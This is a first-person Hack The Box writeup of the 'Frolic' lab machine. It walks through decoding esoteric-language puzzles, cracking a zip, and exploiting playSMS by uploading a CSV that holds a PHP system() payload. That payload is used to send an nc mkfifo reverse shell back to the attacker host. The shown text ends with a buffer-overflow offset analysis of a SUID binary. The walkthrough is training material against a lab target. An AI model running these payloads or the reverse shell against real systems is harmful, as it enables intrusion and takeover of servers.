---
layout: post
title:  "Frolic Writeup - Hack The Box"
date:   2024-04-30
desc: ""
keywords: "HTB,eWPT,Linux,EsotericLanguages,Ook,Brainfuck,BufferOverflow,Ret2libc,PlaySMS,Easy"
categories: [HTB]
tags: [HTB,eWPT,Linux,EsotericLanguages,Ook,Brainfuck,BufferOverflow,Ret2libc,PlaySMS,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic.png" width="100%" style="margin: 0 auto;display: block; max-width: 400px;">
<br /><br />

I continue with the saga of **Buffer Overflow** themed boxes from **[Hack The Box](https://www.hackthebox.com){:target="_blank"}**, now it's time for the **Frolic** machine. It is classified as **`Easy`**, since accessing as a **www-data** user is not very realistic, in my opinion this part is very **CTF**, but then it gets more demanding, since you have to exploit a binary and you must have some basic concepts of **[Reverse Engineering](https://www.techtarget.com/searchsoftwarequality/definition/reverse-engineering){:target="_blank"}** and research a lot, so that the concept of **Buffer Overflow** is being assimilated since this case is the simplest. I access the **[HTB's](https://www.hackthebox.com){:target="_blank"}** platform to spawn the machine. Here I go!

<br /><br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With `ping` I verify that I already have connectivity with it. I always count with S4vitar's **[whichSystem.py](https://pastebin.com/MJKeviqb){:target="_blank"}** script to confirm the **Operating System** I am going to be dealing with, it can also be done with `nmap` but it makes a lot of **noise** to perform this task, instead using the **TTL** you can get this information. It is possible to configure in the machine that the **TTL** is not the one that comes predefined, but it is not a very used practice since there are techniques and tools that can be used to know with certainty the type of **OS**. I also use `nmap` to know which ports I will have to enumerate.

```bash
ping -c 1 10.10.10.111
whichSystem.py 10.10.10.111
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.111 -oG allPorts
```

<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />


I continue with the **Reconnaissance** phase, for that it is essential to use the `nmap` tool, used efficiently you get a lot of information from the services offered on each port, also has custom script programmed in **[Lua](https://nmap.org/book/nse-language.html){:target="_blank"}** (which inform me about vulnerabilities for each version of the service). With this data I can have an idea of the **Codename** of the Operating System, something that can help me in later phases.

```bash
nmap -sCV -p22,139,445,1880,9999 10.10.10.111 -oN targeted
cat targeted
#    --> OpenSSH 7.2p2 Ubuntu 4ubuntu2.4
#    google.es --> OpenSSH 7.2p2 4ubuntu2.4 launchpad    xenial
#    --> nginx 1.10.3
#    google.es --> nginx 1.10.3 launchpad      xenial
```

<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now, as most of the time, I'm going to focus on the web services available, I like to start with them because they provide me with information without being noticed, using non-invasive tools and even doing **OSINT**. With `whatweb` I start researching about the technologies used and with the browsers I access them, in one is exposed the **[Node-Red](https://nodered.org/about/){:target="_blank"}** tool and in the other, it is the typical welcome page of the **Nginx** web server, where I find a domain, so I add it and then list subdomains. I also find a path to access the **[Node-Red](https://nodered.org/about/){:target="_blank"}** dashboard but I have no luck, neither information of this path with `curl`.

```bash
cat targeted | grep http
whatweb http://10.10.10.111:1880 http://10.10.10.111:9999

nvim /etc/hosts
cat /etc/hosts | tail -n 1
# 10.10.10.111  frolic.htb
ping -c 1 frolic.htb            # :)

curl -s -X GET http://frolic.htb:1880/ui
curl -s -X POST http://frolic.htb:1880/ui
curl -s -X GET http://frolic.htb:1880/ui -I
```

> **Node-RED** is a flow-based programming tool, originally developed by **IBM’s Emerging Technology Services** team and now a part of the **OpenJS Foundation**. Invented by J. Paul Morrison in the 1970s, flow-based programming is a way of describing an application’s behavior as a network of black-boxes, or “nodes” as they are called in **Node-RED**.

<br/>
<img src="{{ site.img_path }}/frolic_writeup/Frolic_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I perform a directory enumeration with `wfuzz` on the first port, but I don't have the necessary permissions to access the resources, I suspect I must be logged in. If I search for the default login directory of the **Nginx** web server, I find that it is **“/admin”**, I access and try some **[SQLi](https://portswigger.net/web-security/sql-injection){:target="_blank"}** but they do not work and also I run the risk of being banned.

```bash
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://frolic.htb:1880/F
UZZ
# settings ?
```

```html
# google.es --> nginx admin panel url     --> /admin/
# http://10.10.10.111:9999/admin/
#    admin:admin
#    admin' or 1=1-- -
```

<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

If I access the source code of the page, I find a javascript script that has the login credentials hardcoded - **very bad practice**. After accessing I find a text that seems to be encoded, I already used an online tool that I used in several CTF, **[dcode](https://www.dcode.fr/symbols-ciphers){:target="_blank"}**, in which I find an esoteric language that has a very similar structure to the text shown on the page, **[Ook](https://www.dcode.fr/ook-language){:target="_blank"}**.

> **Ook:** The programming language Ook! Is inspired by Brainfuck language and consists of the words Ook Ook.

<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I can use `nvim` to adjust the found text to transform it to the **Ook** language, or even create an oneliner. Then in the **[dcode](https://www.dcode.fr/ook-language){:target="_blank"}** page I can decipher the text, but what I get I don't really understand what I can use it for.

```bash
nvim Ook_code.txt
#    :%s/\./Ook\/./g
#    :%s/\!/Ook\/!/g
#    :%s/?/Ook?/g

cat Ook_code.txt | sed 's/\./Ook\./g' | sed 's/\!/Ook\!/g' | sed 's/?/Ook?/g'
cat Ook_code.txt | sed 's/\./Ook\./g' | sed 's/\!/Ook\!/g' | sed 's/?/Ook?/g' | xclip -sel clip
# dcode -->     Nothing here check /asdiSIAJJ0QWE9JAS
```

<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

After thinking for a while, which indicates my lack of concentration, I follow the dynamics that the box has been having and use the text found as a path in the web service on port **9999**, I find another text that seems to be encoded in **Base64**, but if I try to decode it is not a readable text, it may be a file or a script. If I save the decoded text as a file and then use `file`, it tells me that it is a **zip** file, now I can use `7z` to see its content but I can't unzip it because I need a password.

```bash
# http://10.10.10.111:9999/asdiSIAJJ0QWE9JAS/

echo "UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBu
C6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve E
MrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFB
LAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEA
AQBPAAAAAwEAAAAA" | tr -d ' ' | base64 -d; echo
#          :(     ???

echo "UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBu
C6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve E
MrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFB
LAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEA
AQBPAAAAAwEAAAAA" | tr -d ' ' | base64 -d > data

7z l data
7z x data
# :(
```

<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now I can try a brute force attack with `fcrackzip` (with `man` I can see what parameters are needed) to decompress the file, it doesn't take long and I can get the **index.php** file that has a hexadecimal text that I decode with `xxd`. But now I find myself again with a text that again seems to be encoded in **Base64**, after several attempts and errors I manage to obtain a text that looks very similar to the **Brainfuck** language (my suspicions are due to the fact that I found it in several **CTFs**). Now I can use **[dcode](https://www.dcode.fr/brainfuck-language){:target="_blank"}** and decode it, I find what seems to be a password.

```bash
fcrackzip -b -D -u -p /usr/share/wordlists/rockyou.txt data
unzip data
cat index.php
#       hexadecimal format!!

cat index.php | xxd -ps -r
cat index.php | xxd -ps -r | xargs
# :( ??

cat index.php | xxd -ps -r > hex_data
cat hex_data | xargs
# :( ??

cat index.php | xxd -ps -r | xclip -sel clip
echo "KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr

KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg

K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t

LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==

" | xargs

echo "KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwr

KysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysg

K1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0t

LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==

" | xargs | tr -d ' ' | base64 -d; echo
#          Brainfuck!!
```

<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I try to log in into the **Node-RED** service but no luck, now what? I go back a step and try to search with `wfuzz` directories in the web service on port **9999**, something I had not done previously. I find several resources, but they don't really catch my attention, except for the **"/dev"** directory which gives me a **Forbidden** message, which gives me a high probability that it has other resources and also the **"/test"** directory that I can filter by the disabled functions, for a possible **RCE**.

```bash
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://frolic.htb:9999/FUZZ

# http://frolic.htb:9999/test/
# http://frolic.htb:9999/backup/
# http://frolic.htb:9999/dev/               Forbidden !!
```

<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

If I enumerate again subdirectories with `wfuzz`, but now in the path **"/dev"** I find more resources, and one in particular that leaks me a directory. And if I access this path it redirects me to the login form of the **PlaySMS** service.

> **playSMS** is a free and open source SMS management software, a web interface for SMS gateways and bulk SMS services.

```bash
wfuzz -c --hc=404 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://frolic.htb:9999/dev/FUZZ
#       test, backup

#       http://10.10.10.111:9999/dev/test

file test
cat test

# http://10.10.10.111:9999/dev/backup/    :)
#    /playsms
# http://frolic.htb:9999/playsms
# Redirect --> http://frolic:9999/playsms/index.php?app=main&inc=core_auth&route=login
```

<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

After logging in with default or typical passwords, I log in with the one I found earlier, and I analyze the **PlaySMS** application a little bit but I don't find much. But by clicking on one of the links I access the official website of the software and get the software version, with `searchsploit` I find some exploits that I can test.

```bash
# http://frolic:9999/playsms/index.php?app=main&inc=core_auth&route=login
# google.es --> playsms default credentials
#    admin:admin               :(
#    guest:guest               :)

searchsploit playsms
searchsploit playsms | grep -v -i 'metasploit'
```

<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I try with the first exploit in the list, with `searchsploit` I get information about how to perform the exploit, I just have to create a **.csv** file with a **"special name"** and upload it to the indicated path to execute a command, but for some reason the file structure is not the indicated one.

```bash
searchsploit -x 42003.txt
nvim example.csv
#        upload          :(

touch "<?php system('uname -a'); dia();?>.csv"
```

<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/frolic_writeup/Frolic_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now I try with the following exploit, if I read the indications of the script, I must create a **.csv** file with a malicious content that they already give me as an example, when I upload the file in the indicated path, it is uploaded correctly. I capture the traffic using `burpsuite` as proxy and modify the **User-Agent** header to inject my command but I don't get the response in the browser.

```bash
searchsploit -x 42044
burpsuite &>/dev/null & disown

nvim backdoor.csv
#         upload          :)
#         http://10.10.10.111:9999/playsms/index.php?app=main&inc=feature_phonebook&route=import&op=list
#         Upload: backdoor.csv

# Burp: User-Agent: id                Intercept OFF         :(
```

> **backdoor.csv**

```bash
Name   Mobile  Email   Group code      Tags
<?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?>    22
```

<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_45.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_46.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_47.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_48.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_49.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_50.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I think the problem resides in the structure of the malicious **.csv** file, I'd better follow the example structure I found on the internet and adapt it to the malicious content of the exploit. Once modified I upload it correctly and inject the command in the indicated **Header** and now I am getting an **RCE**.

```bash
nvim backdoor.csv
```

> **backdoor.csv**

```bash
Name,Mobile,Email,Group code,Tags
<?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?>,2,,,
```

<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_51.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_52.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_53.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/frolic_writeup/Frolic_54.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I can execute commands on the victim machine, I test the connectivity to it before trying to get a **Reverse Shell**. The next step is to send me the **Reverse Shell**, there are many resources on the Web to find examples, but I always resort to **[Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet){:target="_target"}**, so I repeat the steps indicated in the exploit and inject the command I want and now I can access the host, now I can execute my first enumeration commands.

```bash
tcpdump -i tun0 icmp -n
#      User-Agent: ping -c 1 10.10.14.16            :)

nc -nlvp 443
#      User-Agent: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 443 >/tmp/f     :)

whoami
hostname
hostname -I
uname -a
lsb_release -a
# xenial !!!
```

<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_55.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_56.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_57.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_58.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Before I continue listing the system, I am going to perform a **Console treatment** to move with greater agility. First some interesting files in the current directory and I find some credentials of known services that can serve me for later, also I can already see the contents of the first flag to prove to have compromised the machine.

```bash
which python3
python3 -c 'import pty;pty.spawn("/bin/sh")'                # [Ctrl^Z]
stty raw -echo;fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 29 columns 128
```

<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_59.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_60.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_61.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I keep performing enumeration commands, but I don't find many things, before uploading some script to automate the search for information that will allow me to escalate privileges, I list some directories and find some interesting hidden folders, because of the name they have. In one of them I find a file that seems to be an executable.

```bash
find \-perm -4000 2>/dev/null
#    --> ./usr/bin/pkexec            :)
getcap / -r 2>/dev/null
sudo -l
id
groups
netstat -nat
ps -faux

cd /home/ayush/.binary
```

<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_62.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_63.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br/>
<img src="{{ site.img_path }}/frolic_writeup/Frolic_64.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I do some research on this file and check with `file` that it is a 32bit binary, I also do some debbugging with `ltrace` and `strace`, but I don't find any useful information. I also see that it has the **SUID bit** enabled, so when I run it I will have the privileges of its owner user, in this case **root**. I run it and I see that it is a basic script that copies a string that I pass as an argument, and also, perhaps most importantly, it is susceptible to **Buffer Overflow**. I transfer it to my attacking machine to perform a deeper debugging.

> **Victime Machine:**

```bash
file rop
./rop
./rop hello
which ltrace
which strace
strace ./rop hello
#        Library Hijacking?    :(:(

ls -la
#    --> -rwsr-xr-x 1 root  root

ltrace ./rop hello

ltrace ./rop AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

./rop AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

# Binary is vulnerable to Buffer Overflow!!

rop $(python -c 'print "A"*40')            # --> SEGMENTATION FAULT      --> BOF
```

> **Attacker Machine:**

```bash
nc -nlvp 443 > rop
```

> **Victime Machine:**

```bash
nc 10.10.14.16 443 < rop
md5sum rop
# :)
```
> **Attacker Machine:**

```bash
md5sum rop
# :)
```

<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_65.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_66.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_67.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_68.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

It is time to appeal to `gdb`, I am going to see if it is updated and then I also have downloaded in my machine the assistant for `gdb`, **[peda](https://github.com/longld/peda){:target="_blank"}**. I run the binary in debug mode, and check that it works correctly, I can also perform a dissassembler of the `main` function to observe the point where the call to the **setuid** function is applied and then I enter a string of 100 characters to produce the **Buffer Overflow** and crash the program. It is necessary to keep in mind the values of the registers, and particularly the **EIP** instruction pointer.

> **PEDA** - Python Exploit Development Assistance for GDB. Enhance the display of gdb: colorize and display disassembly codes, registers, memory information during debugging.

```bash
chmod +x rop
./rop

gdb --help
#    --> This is the GNU debugger.

sudo apt install gdb

gdb ./rop
  /> r AAAAA                    # run
  /> disass main                # Disassemble a specified section of memory
#        --> 0x8048380 <setuid@plt>
  /> r $(python -c 'print "A"*100')        # :(
  /> r $(python2 -c 'print "A"*100')       # :)
```

<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_69.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_70.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_71.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_72.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_73.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Before performing any kind of **Buffer Overflow** exploitation, I must do some research on how a stack works and on the vulnerability itself, and I found these two resources that were of great help and from which I had some small notes: [Stack Memory: An Overview](https://www.varonis.com/blog/stack-memory-3){:target="_blank"} and [What is x64dbg + How to Use It](https://www.varonis.com/blog/how-to-use-x64dbg){:target="_blank"}.

> Some common instructions:

- PUSH: Pushes a value onto the stack
- POP: Pops a value off the stack
- CALL: Executes a function
- RET: Returns the value of a completed function
- JMP: Jumps to an address location
- CMP: Compares two values
- MOV: Moves data from one location to another
- ADD: Adds a value
- SUB:  Subtracts a value

> Registers:

- EAX: Used for addition, multiplication and return values
- EBX: Generic register, used for various operations
- ECX: Used as a counter
- EDX: Generic register, used for various operations
- EBP: Used to reference arguments and local variables
- ESP: Points to the last argument on the stack
- ESI/EDI: Used in memory transfer instructions

> The **EIP** isn’t a register, this is the instruction pointer that points to the current instruction in x64dbg. This field contains the address where the instruction resides.

> The register **‘ESP’** is used to point to the next item on the stack and is referred to as the ‘stack pointer’.

> **EBP** aka the ‘frame pointer’ serves as an unchanging reference point for data on the stack. This allows the program to work out how far away something in the stack is from this point. So if a variable is two ‘building blocks’ away then it is [EBP+8] as each ‘block’ in the stack is 4 bytes.

As I already know that the program crashes when entering a string that exceeds the buffer and overwrites important registers for the execution of the program, the next step is to know **how many characters** I must enter to get the **EIP** control, this means to calculate the **offset**. With `gdb` this can be done quickly and get this value, for some reason on my machine I get a value that is not the indicated, I do not know if it is because the **Randomization of Virtual Address Space** is enabled and the victim machine is not.

```bash
gdb ./rop
  /> help pattern
  /> help pattern create
  /> pattern create 100
  /> r "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"
  /> pattern offset AAHA
  /> pattern offset 0x41484141
  /> pattern offset $eip
# --> 62
  /> r $(python2 -c 'print "A"*61 + "B"*4')
# :( ??
```

<br/>
<img src="{{ site.img_path }}/frolic_writeup/Frolic_74.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_75.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_76.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/frolic_writeup/Frolic_77.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

After researching for a while, I can't find much information, so thanks to [0xdf's writeup](https://0xdf.gitlab.io/2019/03/23/htb-frolic.html){:target="_blank"} I find the indicated value. Now I try again, I generate a string with **52 A's** and then **4 B's**, and I can see that the **EIP** has stored what I was looking for.

```bash
gdb ./rop
  /> r $(python2 -c 'print "A"*52 + "B"*4')
#  --> $eip   : 0x42424242 ("BBBB"?)              :)
```

<br />
